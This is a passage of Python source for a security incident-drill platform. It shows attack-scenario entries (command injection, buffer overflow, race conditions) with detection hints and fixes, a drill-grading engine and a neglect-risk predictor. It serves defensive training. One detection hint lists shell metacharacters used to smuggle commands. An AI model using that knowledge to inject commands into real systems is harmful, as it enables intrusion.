            display_name="OS Command Injection",
            category="injection",
            severity="critical",
            mitre_technique_id="T1059",
            mitre_technique_name="Command and Scripting Interpreter",
            affected_components_pattern="*shell*,*exec*,*command*,*run*,*system*",
            description=(
                "Attacker injects OS commands through unsanitized parameters passed "
                "to shell commands, achieving arbitrary command execution."
            ),
            detection_hints=[
                "Request parameters containing |, ;, &&, || or backtick characters",
                "Unexpected child process spawning from web application user",
                "Process tree showing web server spawning shell processes",
                "OS command output appearing in HTTP responses",
            ],
            expected_response_time_minutes=20,
            cvss_base=9.8,
            cwe_id="CWE-77",
            remediation_steps=[
                "Use subprocess.run with shell=False and argument list (never string)",
                "Validate inputs against allowlist before passing to system calls",
                "Remove unnecessary shell command invocations from application code",
                "Apply AppArmor profile to restrict process spawning",
            ],
            tags=["command-injection", "rce", "shell"],
        ),
        AttackScenario(
            name="buffer_overflow",
            display_name="Buffer Overflow / Memory Corruption",
            category="memory",
            severity="critical",
            mitre_technique_id="T1203",
            mitre_technique_name="Exploitation for Client Execution",
            affected_components_pattern="*native*,*c*,*cpp*,*binary*,*ffi*",
            description=(
                "Buffer overflow in native code (C/C++) allows attackers to corrupt "
                "memory and achieve code execution by overwriting return addresses."
            ),
            detection_hints=[
                "Memory sanitizer alerts (AddressSanitizer, Valgrind) in test results",
                "Segmentation faults or access violation exceptions in production",
                "Unusual memory usage spikes followed by process crashes",
                "Stack canary violations reported by OS or compiler",
            ],
            expected_response_time_minutes=60,
            cvss_base=9.0,
            cwe_id="CWE-120",
            remediation_steps=[
                "Enable compiler protections: -fstack-protector-all, -D_FORTIFY_SOURCE=2",
                "Use bounds-checked string functions (strncpy, strlcpy)",
                "Apply ASLR and NX/DEP system-wide",
                "Fuzz the affected binary with AFL++ or libFuzzer",
            ],
            tags=["buffer-overflow", "memory", "native", "c"],
        ),
        AttackScenario(
            name="race_condition",
            display_name="Race Condition / TOCTOU",
            category="concurrency",
            severity="high",
            mitre_technique_id="T1548",
            mitre_technique_name="Abuse Elevation Control Mechanism",
            affected_components_pattern="*shared*,*resource*,*lock*,*transaction*",
            description=(
                "Time-of-check to time-of-use (TOCTOU) vulnerabilities allow "
                "attackers to exploit the window between a security check and resource use."
            ),
            detection_hints=[
                "File operations between stat() and open() calls",
                "Database operations outside transactions on shared resources",
                "Concurrent requests causing inconsistent state in counters/balances",
                "Test failures that occur intermittently under load",
            ],
            expected_response_time_minutes=120,
            cvss_base=7.0,
            cwe_id="CWE-362",
            remediation_steps=[
                "Use atomic file operations (O_EXCL flag, rename-to-target pattern)",
                "Wrap shared resource access in database transactions with SELECT FOR UPDATE",
                "Apply optimistic locking with version fields for concurrent updates",
                "Use threading.Lock() or asyncio.Lock() for in-process shared state",
            ],
            tags=["race-condition", "toctou", "concurrency"],
        ),
    ]

    # Severity ordering for comparison
    _SEVERITY_ORDER = {"critical": 4, "high": 3, "medium": 2, "low": 1}

    def __init__(self) -> None:
        self._by_name: Dict[str, AttackScenario] = {s.name: s for s in self._SCENARIOS}
        self._by_category: Dict[str, List[AttackScenario]] = {}
        for s in self._SCENARIOS:
            self._by_category.setdefault(s.category, []).append(s)

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def get_scenario(self, name: str) -> AttackScenario:
        """Return a scenario by slug name.

        Args:
            name: Scenario slug (e.g. "log4shell", "sqli").

        Raises:
            KeyError: If scenario name is not found in the library.
        """
        if name not in self._by_name:
            available = ", ".join(sorted(self._by_name.keys()))
            raise KeyError(
                f"Scenario '{name}' not found. Available: {available}"
            )
        return self._by_name[name]

    def list_scenarios(
        self,
        category: Optional[str] = None,
        min_severity: Optional[str] = None,
        tags: Optional[List[str]] = None,
    ) -> List[AttackScenario]:
        """List scenarios, optionally filtered by category/severity/tags.

        Args:
            category: Filter by category (e.g. "web", "injection", "rce").
            min_severity: Minimum severity level to include.
            tags: Only return scenarios that have ALL provided tags.

        Returns:
            Sorted list of matching AttackScenario objects.
        """
        results = list(self._SCENARIOS)

        if category:
            results = [s for s in results if s.category == category]

        if min_severity:
            min_rank = self._SEVERITY_ORDER.get(min_severity.lower(), 0)
            results = [
                s for s in results
                if self._SEVERITY_ORDER.get(s.severity, 0) >= min_rank
            ]

        if tags:
            tag_set = set(t.lower() for t in tags)
            results = [
                s for s in results
                if tag_set.issubset(set(t.lower() for t in s.tags))
            ]

        # Sort: severity desc, then name asc
        results.sort(
            key=lambda s: (-self._SEVERITY_ORDER.get(s.severity, 0), s.name)
        )
        return results

    def random_scenario(
        self,
        min_severity: str = "low",
        category: Optional[str] = None,
        exclude_names: Optional[List[str]] = None,
    ) -> AttackScenario:
        """Return a random scenario meeting the given criteria.

        Args:
            min_severity: Minimum severity level for the random pick.
            category: Optional category filter.
            exclude_names: Scenario names to exclude (avoid repeats).

        Raises:
            ValueError: If no scenarios match the criteria.
        """
        candidates = self.list_scenarios(
            category=category, min_severity=min_severity
        )
        if exclude_names:
            exc = set(exclude_names)
            candidates = [s for s in candidates if s.name not in exc]
        if not candidates:
            raise ValueError(
                f"No scenarios match min_severity='{min_severity}', "
                f"category='{category}', excludes={exclude_names}"
            )
        return random.choice(candidates)

    def all_names(self) -> List[str]:
        """Return sorted list of all scenario names."""
        return sorted(self._by_name.keys())

    def all_categories(self) -> List[str]:
        """Return sorted list of all distinct categories."""
        return sorted(self._by_category.keys())

    def to_dict(self) -> Dict[str, Any]:
        """Serialize the full library to a dict (for API responses)."""
        return {
            "total_scenarios": len(self._SCENARIOS),
            "categories": self.all_categories(),
            "scenarios": [
                {
                    "name": s.name,
                    "display_name": s.display_name,
                    "category": s.category,
                    "severity": s.severity,
                    "mitre_technique_id": s.mitre_technique_id,
                    "mitre_technique_name": s.mitre_technique_name,
                    "cvss_base": s.cvss_base,
                    "cwe_id": s.cwe_id,
                    "expected_response_time_minutes": s.expected_response_time_minutes,
                    "tags": s.tags,
                }
                for s in self._SCENARIOS
            ],
        }


# ---------------------------------------------------------------------------
# AUTOMATED GRADING ENGINE
# ---------------------------------------------------------------------------


@dataclass
class GradingDimension:
    """A single graded dimension with score, rubric details, and benchmark."""

    name: str
    score: float                  # 0.0 – 10.0
    benchmark: float              # Industry benchmark score
    delta_vs_benchmark: float     # score - benchmark
    grade_letter: str             # A+ / A / B / C / D / F
    rubric_details: str
    recommendations: List[str] = field(default_factory=list)


@dataclass
class DrillGradingReport:
    """Full grading report for a completed drill."""

    drill_id: str
    org_id: str
    scenario_name: str
    component: str
    graded_at: str

    # Six dimensions
    detection_speed: GradingDimension
    triage_accuracy: GradingDimension
    remediation_speed: GradingDimension
    communication: GradingDimension
    documentation_quality: GradingDimension
    post_incident_review: GradingDimension

    # Aggregates
    overall_score: float
    overall_grade: str
    percentile_estimate: float       # Estimated percentile vs industry
    summary: str
    strengths: List[str]
    improvement_areas: List[str]
    next_drill_suggestions: List[str]


class AutoGrader:
    """Automated drill grading engine with 6-dimension rubric.

    Grades a completed FAIL Engine drill across:
    1. Detection Speed     — How quickly the synthetic finding was noticed
    2. Triage Accuracy     — Correct severity/classification vs expected
    3. Remediation Speed   — Time from triage to confirmed fix
    4. Communication       — Team notification and escalation quality
    5. Documentation       — Quality of notes, comments, and run-book updates
    6. Post-Incident Review — PIR completeness (root cause, lessons learned)

    Industry benchmarks represent median performance across Fortune-500
    security teams (sourced from SANS SOC Survey 2024).

    Usage::

        grader = AutoGrader()
        report = grader.grade_drill(drill_record)
        print(report.overall_grade)
    """

    # Industry benchmarks per dimension (0–10)
    INDUSTRY_BENCHMARKS: Dict[str, float] = {
        "detection_speed": 6.2,
        "triage_accuracy": 7.1,
        "remediation_speed": 5.8,
        "communication": 6.5,
        "documentation_quality": 5.2,
        "post_incident_review": 4.8,
    }

    # Dimension weights (must sum to 1.0)
    DIMENSION_WEIGHTS: Dict[str, float] = {
        "detection_speed": 0.22,
        "triage_accuracy": 0.20,
        "remediation_speed": 0.22,
        "communication": 0.14,
        "documentation_quality": 0.12,
        "post_incident_review": 0.10,
    }

    # SLA targets per severity (minutes)
    _DETECTION_SLA: Dict[str, int] = {
        "critical": 15,
        "high": 30,
        "medium": 60,
        "low": 120,
    }
    _TRIAGE_SLA: Dict[str, int] = {
        "critical": 10,
        "high": 20,
        "medium": 45,
        "low": 90,
    }
    _REMEDIATION_SLA: Dict[str, int] = {
        "critical": 120,
        "high": 360,
        "medium": 720,
        "low": 1440,
    }

    def __init__(self) -> None:
        self._scenario_library = ScenarioLibrary()

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def grade_drill(self, drill: Any) -> DrillGradingReport:
        """Auto-grade a drill record and return a detailed report.

        Args:
            drill: A Drill dataclass instance from DrillEngine.

        Returns:
            DrillGradingReport with all 6 dimensions scored.
        """
        tl = drill.timeline
        severity = drill.severity.value if hasattr(drill.severity, "value") else str(drill.severity)

        # --- Compute raw time deltas ---
        detection_minutes = self._minutes_between(tl.injected_at, tl.detected_at)
        triage_minutes = self._minutes_between(tl.detected_at, tl.triaged_at)
        remediation_minutes = self._minutes_between(tl.injected_at, tl.remediated_at)

        # --- Grade each dimension ---
        detection_dim = self._grade_detection_speed(
            detection_minutes, severity
        )
        triage_dim = self._grade_triage_accuracy(
            drill, triage_minutes, severity
        )
        remediation_dim = self._grade_remediation_speed(
            remediation_minutes, severity
        )
        communication_dim = self._grade_communication(drill)
        documentation_dim = self._grade_documentation_quality(drill)
        pir_dim = self._grade_post_incident_review(drill)

        # --- Compute weighted overall ---
        dims = {
            "detection_speed": detection_dim,
            "triage_accuracy": triage_dim,
            "remediation_speed": remediation_dim,
            "communication": communication_dim,
            "documentation_quality": documentation_dim,
            "post_incident_review": pir_dim,
        }
        overall = sum(
            dims[k].score * self.DIMENSION_WEIGHTS[k]
            for k in self.DIMENSION_WEIGHTS
        )
        overall_grade = self._score_to_letter(overall)
        percentile = self._estimate_percentile(overall)

        # --- Build summary text ---
        strengths, improvements = self._extract_strengths_improvements(dims)
        summary = self._build_summary(overall, overall_grade, dims, severity)
        next_suggestions = self._suggest_next_drills(dims, drill.scenario_name)

        return DrillGradingReport(
            drill_id=drill.drill_id,
            org_id=drill.org_id,
            scenario_name=drill.scenario_name,
            component=drill.target_component,
            graded_at=datetime.now(timezone.utc).isoformat(),
            detection_speed=detection_dim,
            triage_accuracy=triage_dim,
            remediation_speed=remediation_dim,
            communication=communication_dim,
            documentation_quality=documentation_dim,
            post_incident_review=pir_dim,
            overall_score=round(overall, 2),
            overall_grade=overall_grade,
            percentile_estimate=round(percentile, 1),
            summary=summary,
            strengths=strengths,
            improvement_areas=improvements,
            next_drill_suggestions=next_suggestions,
        )

    def generate_report(self, drill: Any) -> Dict[str, Any]:
        """Generate a JSON-serializable detailed drill report.

        Args:
            drill: A Drill dataclass instance.

        Returns:
            Dict suitable for API response or storage.
        """
        report = self.grade_drill(drill)
        return {
            "drill_id": report.drill_id,
            "org_id": report.org_id,
            "scenario_name": report.scenario_name,
            "component": report.component,
            "graded_at": report.graded_at,
            "overall_score": report.overall_score,
            "overall_grade": report.overall_grade,
            "percentile_estimate": report.percentile_estimate,
            "summary": report.summary,
            "dimensions": {
                "detection_speed": self._dim_to_dict(report.detection_speed),
                "triage_accuracy": self._dim_to_dict(report.triage_accuracy),
                "remediation_speed": self._dim_to_dict(report.remediation_speed),
                "communication": self._dim_to_dict(report.communication),
                "documentation_quality": self._dim_to_dict(report.documentation_quality),
                "post_incident_review": self._dim_to_dict(report.post_incident_review),
            },
            "strengths": report.strengths,
            "improvement_areas": report.improvement_areas,
            "next_drill_suggestions": report.next_drill_suggestions,
            "industry_benchmarks": self.INDUSTRY_BENCHMARKS,
        }

    # ------------------------------------------------------------------
    # Dimension graders (private)
    # ------------------------------------------------------------------

    def _grade_detection_speed(
        self, minutes: Optional[int], severity: str
    ) -> GradingDimension:
        """Grade how quickly the synthetic finding was detected."""
        sla = self._DETECTION_SLA.get(severity, 60)
        benchmark = self.INDUSTRY_BENCHMARKS["detection_speed"]

        if minutes is None:
            score = 0.0
            rubric = "Finding was never detected during drill window."
            recs = [
                "Implement alert rules for synthetic findings",
                "Ensure monitoring covers this component",
                "Run detection tooling health check",
            ]
        elif minutes <= sla * 0.5:
            score = 10.0
            rubric = (
                f"Exceptional: detected in {minutes}m vs SLA of {sla}m "
                f"(≤50% of target — elite performance)."
            )
            recs = ["Maintain current monitoring cadence"]
        elif minutes <= sla:
            pct = minutes / sla
            score = round(10.0 - (pct * 2.5), 1)
            rubric = (
                f"Within SLA: detected in {minutes}m vs target {sla}m "
                f"({pct*100:.0f}% of SLA consumed)."
            )
            recs = ["Consider reducing alert thresholds for faster triggering"]
        else:
            overrun = minutes / sla
            score = max(0.0, round(7.5 - (overrun - 1) * 3.0, 1))
            rubric = (
                f"SLA breached: detected in {minutes}m vs target {sla}m "
                f"({overrun:.1f}x SLA — needs improvement)."
            )
            recs = [
                "Add real-time alerting for this vulnerability class",
                f"Set SIEM correlation rule targeting {severity} findings",
                "Review monitoring coverage gap for this component",
            ]

        return GradingDimension(
            name="detection_speed",
            score=min(10.0, max(0.0, score)),
            benchmark=benchmark,
            delta_vs_benchmark=round(score - benchmark, 2),
            grade_letter=self._score_to_letter(score),
            rubric_details=rubric,
            recommendations=recs,
        )

    def _grade_triage_accuracy(
        self, drill: Any, triage_minutes: Optional[int], severity: str
    ) -> GradingDimension:
        """Grade triage classification accuracy and speed."""
        benchmark = self.INDUSTRY_BENCHMARKS["triage_accuracy"]
        sla = self._TRIAGE_SLA.get(severity, 45)
        score = 5.0
        rubric_parts = []
        recs: List[str] = []

        # Check classification accuracy
        expected = getattr(drill, "severity", None)
        actual_tc = getattr(drill, "triage_classification", None)

        if actual_tc is not None:
            actual_val = actual_tc.value if hasattr(actual_tc, "value") else str(actual_tc)
            expected_val = expected.value if hasattr(expected, "value") else str(expected)
            # Normalize: triage_classification might be "critical_confirmed" etc.
            if expected_val.lower() in actual_val.lower():
                score += 3.0
                rubric_parts.append(f"Correct classification: {actual_val}")
            else:
                score -= 1.0
                rubric_parts.append(
                    f"Misclassification: got '{actual_val}', expected '{expected_val}'"
                )
                recs.append(
                    f"Review {expected_val} severity indicators for this scenario class"
                )
        else:
            score -= 2.0
            rubric_parts.append("No triage classification recorded")
            recs.append("Ensure triage classification is logged on every drill")

        # Check triage speed
        if triage_minutes is not None:
            if triage_minutes <= sla:
                score += 2.0
                rubric_parts.append(
                    f"Triage speed: {triage_minutes}m (within {sla}m SLA)"
                )
            else:
                rubric_parts.append(
                    f"Triage speed: {triage_minutes}m (exceeded {sla}m SLA)"
                )
                recs.append("Implement escalation triggers to speed triage")

        # Escalation check
        if getattr(drill, "escalated", False) and severity in ("critical", "high"):
            score += 1.0
            rubric_parts.append("Correctly escalated to senior team")
        elif not getattr(drill, "escalated", False) and severity == "critical":
            score -= 1.0
            rubric_parts.append("Critical finding not escalated — escalation required")
            recs.append("Define escalation matrix for critical-severity findings")

        score = min(10.0, max(0.0, score))
        return GradingDimension(
            name="triage_accuracy",
            score=score,
            benchmark=benchmark,
            delta_vs_benchmark=round(score - benchmark, 2),
            grade_letter=self._score_to_letter(score),
            rubric_details="; ".join(rubric_parts),
            recommendations=recs,
        )

    def _grade_remediation_speed(
        self, minutes: Optional[int], severity: str
    ) -> GradingDimension:
        """Grade remediation speed against severity SLA."""
        sla = self._REMEDIATION_SLA.get(severity, 720)
        benchmark = self.INDUSTRY_BENCHMARKS["remediation_speed"]

        if minutes is None:
            score = 0.0
            rubric = "Remediation not completed during drill window."
            recs = [
                "Define runbooks with step-by-step fix procedures",
                "Ensure team has write access to affected components",
                "Set remediation SLA timers in incident tracker",
            ]
        elif minutes <= sla * 0.5:
            score = 10.0
            rubric = f"Exceptional remediation: {minutes}m vs SLA {sla}m (50%)"
            recs = ["Document fast-path remediation procedure as standard runbook"]
        elif minutes <= sla:
            ratio = minutes / sla
            score = round(10.0 - ratio * 3.0, 1)
            rubric = f"Within SLA: remediated in {minutes}m vs {sla}m target"
            recs = ["Consider pre-approved remediation automation for common fixes"]
        else:
            overrun = minutes / sla
            score = max(0.0, round(6.5 - (overrun - 1) * 2.5, 1))
            rubric = f"SLA overrun: {minutes}m vs target {sla}m ({overrun:.1f}x)"
            recs = [
                "Create pre-approved change requests for common remediations",
                f"Prepare fix playbook for {severity} findings of this type",
                "Review approval chain — consider fast-track for known fixes",
            ]

        return GradingDimension(
            name="remediation_speed",
            score=min(10.0, max(0.0, score)),
            benchmark=benchmark,
            delta_vs_benchmark=round(score - benchmark, 2),
            grade_letter=self._score_to_letter(score),
            rubric_details=rubric,
            recommendations=recs,
        )

    def _grade_communication(self, drill: Any) -> GradingDimension:
        """Grade communication: team notification, escalation, stakeholders."""
        benchmark = self.INDUSTRY_BENCHMARKS["communication"]
        score = 4.0
        rubric_parts = []
        recs: List[str] = []

        notified = getattr(drill, "notified_teams", []) or []
        escalated = getattr(drill, "escalated", False)
        severity = getattr(drill.severity, "value", "medium") if hasattr(drill, "severity") else "medium"

        if notified:
            score += min(3.0, len(notified) * 1.0)
            rubric_parts.append(f"Notified {len(notified)} team(s): {', '.join(notified)}")
        else:
            score -= 1.0
            rubric_parts.append("No teams notified")
            recs.append("Define notification matrix: who to alert per severity level")

        if escalated:
            score += 1.5
            rubric_parts.append("Escalation confirmed")
        elif severity in ("critical", "high"):
            score -= 0.5
            rubric_parts.append(f"{severity.title()} finding — escalation expected but not recorded")
            recs.append(f"Mandate escalation for {severity} findings within triage SLA")

        notes = getattr(drill, "notes", "") or ""
        if len(notes) >= 200:
            score += 1.5
            rubric_parts.append("Detailed communication notes logged")
        elif len(notes) >= 50:
            score += 0.5
            rubric_parts.append("Basic notes present")
        else:
            recs.append("Add detailed incident notes during drills (min 200 chars)")

        score = min(10.0, max(0.0, score))
        return GradingDimension(
            name="communication",
            score=score,
            benchmark=benchmark,
            delta_vs_benchmark=round(score - benchmark, 2),
            grade_letter=self._score_to_letter(score),
            rubric_details="; ".join(rubric_parts) or "No communication data",
            recommendations=recs,
        )

    def _grade_documentation_quality(self, drill: Any) -> GradingDimension:
        """Grade documentation: notes completeness, timeline fidelity."""
        benchmark = self.INDUSTRY_BENCHMARKS["documentation_quality"]
        score = 3.0
        rubric_parts = []
        recs: List[str] = []

        notes = getattr(drill, "notes", "") or ""
        tl = drill.timeline
        events = getattr(tl, "events", []) or []

        # Notes length scoring
        if len(notes) >= 500:
            score += 3.5
            rubric_parts.append("Comprehensive notes (≥500 chars)")
        elif len(notes) >= 200:
            score += 2.0
            rubric_parts.append("Adequate notes (≥200 chars)")
        elif len(notes) >= 50:
            score += 0.5
            rubric_parts.append("Minimal notes (<200 chars)")
            recs.append("Document root cause analysis in drill notes")
        else:
            rubric_parts.append("No meaningful notes recorded")
            recs.append("Always record notes during and after drills")

        # Timeline event richness
        if len(events) >= 5:
            score += 2.0
            rubric_parts.append(f"Rich event timeline ({len(events)} events)")
        elif len(events) >= 2:
            score += 1.0
            rubric_parts.append(f"Partial event timeline ({len(events)} events)")
        else:
            recs.append("Log fine-grained events during drill (detection, analysis, fix steps)")

        # Check for key timestamps
        ts_fields = ["injected_at", "detected_at", "triaged_at", "remediated_at"]
        populated = sum(1 for f in ts_fields if getattr(tl, f, None))
        if populated == 4:
            score += 1.5
            rubric_parts.append("All four key timestamps recorded")
        else:
            score += populated * 0.3
            rubric_parts.append(f"Only {populated}/4 key timestamps recorded")
            recs.append("Record all drill timestamps: detected, triaged, remediated")

        score = min(10.0, max(0.0, score))
        return GradingDimension(
            name="documentation_quality",
            score=score,
            benchmark=benchmark,
            delta_vs_benchmark=round(score - benchmark, 2),
            grade_letter=self._score_to_letter(score),
            rubric_details="; ".join(rubric_parts) or "No documentation",
            recommendations=recs,
        )

    def _grade_post_incident_review(self, drill: Any) -> GradingDimension:
        """Grade post-incident review completion and quality."""
        benchmark = self.INDUSTRY_BENCHMARKS["post_incident_review"]
        notes = getattr(drill, "notes", "") or ""
        score = 2.0
        rubric_parts: List[str] = []
        recs: List[str] = []

        # Check for PIR keywords in notes
        pir_keywords = [
            "root cause", "lesson", "action item", "follow-up",
            "runbook", "post-mortem", "prevented", "improvement",
        ]
        found_keywords = [kw for kw in pir_keywords if kw.lower() in notes.lower()]
        if len(found_keywords) >= 4:
            score += 5.0
            rubric_parts.append(
                f"Strong PIR content: {', '.join(found_keywords[:4])} covered"
            )
        elif len(found_keywords) >= 2:
            score += 2.5
            rubric_parts.append(f"Partial PIR: {', '.join(found_keywords)} mentioned")
            recs.append("Expand PIR to cover: root cause, action items, runbook updates")
        elif len(found_keywords) == 1:
            score += 1.0
            rubric_parts.append(f"Minimal PIR: only '{found_keywords[0]}' mentioned")
            recs.append("Write a structured PIR within 48h of drill completion")
        else:
            rubric_parts.append("No PIR content detected in notes")
            recs.extend([
                "Conduct PIR within 48h: what worked, what failed, action items",
                "Update runbooks with insights from this drill",
                "Share findings with broader security team",
            ])

        # Check drill status
        status_val = getattr(drill, "status", None)
        if status_val:
            st = status_val.value if hasattr(status_val, "value") else str(status_val)
            if st == "graded":
                score += 1.0
                rubric_parts.append("Drill fully graded (review complete)")
            elif st == "remediated":
                score += 0.5
                rubric_parts.append("Drill remediated but PIR not yet graded")
                recs.append("Grade the drill to close the PIR loop")

        score = min(10.0, max(0.0, score))
        return GradingDimension(
            name="post_incident_review",
            score=score,
            benchmark=benchmark,
            delta_vs_benchmark=round(score - benchmark, 2),
            grade_letter=self._score_to_letter(score),
            rubric_details="; ".join(rubric_parts) or "No PIR data",
            recommendations=recs,
        )

    # ------------------------------------------------------------------
    # Utility helpers (private)
    # ------------------------------------------------------------------

    @staticmethod
    def _minutes_between(
        start_iso: Optional[str], end_iso: Optional[str]
    ) -> Optional[int]:
        """Compute minutes between two ISO timestamps."""
        if not start_iso or not end_iso:
            return None
        try:
            start = datetime.fromisoformat(start_iso)
            end = datetime.fromisoformat(end_iso)
            if start.tzinfo is None:
                start = start.replace(tzinfo=timezone.utc)
            if end.tzinfo is None:
                end = end.replace(tzinfo=timezone.utc)
            return max(0, int((end - start).total_seconds() / 60))
        except (ValueError, TypeError):
            return None

    @staticmethod
    def _score_to_letter(score: float) -> str:
        """Convert numeric score (0-10) to letter grade."""
        if score >= 9.5:
            return "A+"
        elif score >= 9.0:
            return "A"
        elif score >= 8.0:
            return "B+"
        elif score >= 7.0:
            return "B"
        elif score >= 6.0:
            return "C+"
        elif score >= 5.0:
            return "C"
        elif score >= 4.0:
            return "D"
        else:
            return "F"

    @staticmethod
    def _estimate_percentile(overall: float) -> float:
        """Estimate percentile ranking vs industry based on overall score."""
        # Approximate normal distribution centered at 6.0, std ~1.5
        z = (overall - 6.0) / 1.5
        # Approximate CDF using error function
        import math
        pct = 50.0 * (1.0 + math.erf(z / math.sqrt(2)))
        return max(1.0, min(99.0, pct))

    @staticmethod
    def _dim_to_dict(dim: GradingDimension) -> Dict[str, Any]:
        """Convert GradingDimension to dict."""
        return {
            "name": dim.name,
            "score": dim.score,
            "benchmark": dim.benchmark,
            "delta_vs_benchmark": dim.delta_vs_benchmark,
            "grade_letter": dim.grade_letter,
            "rubric_details": dim.rubric_details,
            "recommendations": dim.recommendations,
        }

    def _extract_strengths_improvements(
        self, dims: Dict[str, GradingDimension]
    ) -> Tuple[List[str], List[str]]:
        """Extract top 3 strengths and top 3 improvement areas."""
        sorted_dims = sorted(dims.values(), key=lambda d: d.score, reverse=True)
        strengths = [
            f"{d.name.replace('_', ' ').title()}: {d.score:.1f}/10 ({d.grade_letter})"
            for d in sorted_dims[:3]
            if d.score >= 6.0
        ]
        improvements = [
            f"{d.name.replace('_', ' ').title()}: {d.score:.1f}/10 — "
            + (d.recommendations[0] if d.recommendations else "Review performance")
            for d in sorted_dims[-3:]
            if d.score < 7.0
        ]
        return strengths, improvements

    def _build_summary(
        self,
        overall: float,
        grade: str,
        dims: Dict[str, GradingDimension],
        severity: str,
    ) -> str:
        """Build a human-readable summary paragraph."""
        best_dim = max(dims.values(), key=lambda d: d.score)
        worst_dim = min(dims.values(), key=lambda d: d.score)
        return (
            f"Overall grade {grade} ({overall:.1f}/10) for this {severity}-severity drill. "
            f"Strongest dimension: {best_dim.name.replace('_',' ')} ({best_dim.score:.1f}). "
            f"Focus area: {worst_dim.name.replace('_',' ')} ({worst_dim.score:.1f}). "
            f"Team is performing at approximately the "
            f"{AutoGrader._estimate_percentile(overall):.0f}th percentile "
            f"vs industry peers."
        )

    def _suggest_next_drills(
        self, dims: Dict[str, GradingDimension], current_scenario: str
    ) -> List[str]:
        """Suggest next drills based on weak dimensions."""
        suggestions: List[str] = []
        if dims["detection_speed"].score < 6.0:
            suggestions.append(
                "Run a stealth injection drill to practice passive detection"
            )
        if dims["triage_accuracy"].score < 6.0:
            suggestions.append(
                "Run severity classification training with mixed-severity scenarios"
            )
        if dims["remediation_speed"].score < 6.0:
            suggestions.append(
                "Conduct a time-boxed remediation sprint drill with pre-staged fix"
            )
        if dims["communication"].score < 6.0:
            suggestions.append(
                "Run a communication-focused drill testing notification workflows"
            )
        if dims["documentation_quality"].score < 5.0:
            suggestions.append(
                "Practice structured incident documentation with templates"
            )
        if dims["post_incident_review"].score < 5.0:
            suggestions.append(
                "Schedule a facilitated PIR workshop with the FAIL Engine team"
            )
        if not suggestions:
            suggestions.append(
                f"Advance to a higher-complexity variant of '{current_scenario}'"
            )
        return suggestions[:4]


# ---------------------------------------------------------------------------
# NEGLECT ZONE PREDICTOR
# ---------------------------------------------------------------------------


@dataclass
class ComponentRiskProfile:
    """Risk profile for a single component."""

    component_id: str
    component_name: str
    neglect_risk_score: float         # 0.0 (low) – 10.0 (critical neglect risk)
    risk_level: str                   # low / medium / high / critical
    days_since_last_drill: int
    historical_avg_score: float
    contributing_factors: Dict[str, float]   # factor_name → contribution
    recommendation: str
    estimated_days_until_critical: Optional[int]


class NeglectZonePredictor:
    """ML-inspired predictor for component neglect risk.

    Identifies which components are most likely to be overlooked in security
    drills and become 'neglect zones' — areas where team readiness degrades
    silently over time.

    Factors considered:
    - Days since last drill (recency)
    - Team size (smaller teams → higher neglect risk per component)
    - Component criticality (blast radius)
    - Change velocity (high churn → changing attack surface)
    - Historical drill scores (poor past performance)
    - Number of past drills (low coverage)

    Uses a weighted scoring model calibrated against security team behavior
    observed across enterprise deployments.

    Usage::

        predictor = NeglectZonePredictor()
        risks = predictor.predict_neglect_risk(component_profiles)
        suggestions = predictor.suggest_next_drills(risks, n=5)
    """

    # Feature weights for neglect risk score
    _FEATURE_WEIGHTS = {
        "recency_score": 0.35,          # Days since last drill (highest weight)
        "criticality_score": 0.20,      # Component criticality level
        "performance_score": 0.20,      # Historical average drill score (inverse)
        "change_velocity_score": 0.15,  # Rate of code/config changes
        "coverage_score": 0.10,         # Number of historical drills (inverse)
    }

    # Risk level thresholds
    _RISK_LEVELS = [
        (8.0, "critical"),
        (6.0, "high"),
        (4.0, "medium"),
        (0.0, "low"),
    ]

    # Days-to-critical projection slope per risk level
    _DECAY_RATE_PER_LEVEL = {
        "critical": 0.15,
        "high": 0.08,
        "medium": 0.04,
        "low": 0.01,
    }

    def predict_neglect_risk(
        self,
        component_profiles: List[Dict[str, Any]],
    ) -> List[ComponentRiskProfile]:
        """Compute neglect risk scores for all provided components.

        Args:
            component_profiles: List of dicts, each with:
                - component_id (str)
                - component_name (str)
                - last_drill_date (str, ISO format or None)
                - team_size (int, default 5)
                - component_criticality (float 0-10, default 5.0)
                - change_velocity (float 0-10, default 3.0)
                - historical_scores (list of float, last N drill scores)
                - drill_count (int, total number of drills run)

        Returns:
            Sorted list of ComponentRiskProfile (highest risk first).
        """
        profiles: List[ComponentRiskProfile] = []

        for cp in component_profiles:
            comp_id = cp.get("component_id", str(uuid.uuid4()))
            comp_name = cp.get("component_name", comp_id)

            # --- Feature extraction ---
            days_since = self._compute_days_since_drill(cp.get("last_drill_date"))
            recency_score = self._recency_to_score(days_since)

            criticality = float(cp.get("component_criticality", 5.0))
            criticality_score = min(10.0, criticality)

            hist_scores = cp.get("historical_scores", [])
            if hist_scores:
                avg_score = statistics.mean(hist_scores)
                # Inverse: low score → high neglect risk
                perf_score = 10.0 - min(10.0, avg_score)
            else:
                avg_score = 0.0
                perf_score = 8.0  # No data → assume underperforming

            change_vel = float(cp.get("change_velocity", 3.0))
            change_score = min(10.0, change_vel)

            drill_count = int(cp.get("drill_count", 0))
            # Low drill count → high neglect
            coverage_score = max(0.0, 10.0 - min(10.0, drill_count * 1.5))

            # Team size factor: small teams have less bandwidth
            team_size = max(1, int(cp.get("team_size", 5)))
            team_factor = max(0.5, min(1.5, 6.0 / team_size))

            # --- Weighted risk score ---
            contributing: Dict[str, float] = {
                "recency_score": recency_score * self._FEATURE_WEIGHTS["recency_score"],
                "criticality_score": criticality_score * self._FEATURE_WEIGHTS["criticality_score"],
                "performance_score": perf_score * self._FEATURE_WEIGHTS["performance_score"],
                "change_velocity_score": change_score * self._FEATURE_WEIGHTS["change_velocity_score"],
                "coverage_score": coverage_score * self._FEATURE_WEIGHTS["coverage_score"],
            }
            raw_risk = sum(contributing.values()) * team_factor
            risk_score = round(min(10.0, max(0.0, raw_risk)), 2)
            risk_level = self._score_to_risk_level(risk_score)

            # --- Project days until critical ---
            days_to_crit = self._project_days_to_critical(
                risk_score, risk_level, days_since
            )

            # --- Recommendation ---
            rec = self._build_recommendation(
                risk_level, days_since, perf_score, change_score, comp_name
            )

            profiles.append(ComponentRiskProfile(
                component_id=comp_id,
                component_name=comp_name,
                neglect_risk_score=risk_score,
                risk_level=risk_level,
                days_since_last_drill=days_since,
                historical_avg_score=round(avg_score, 2),
                contributing_factors=contributing,
                recommendation=rec,
                estimated_days_until_critical=days_to_crit,
            ))

        profiles.sort(key=lambda p: p.neglect_risk_score, reverse=True)
        return profiles

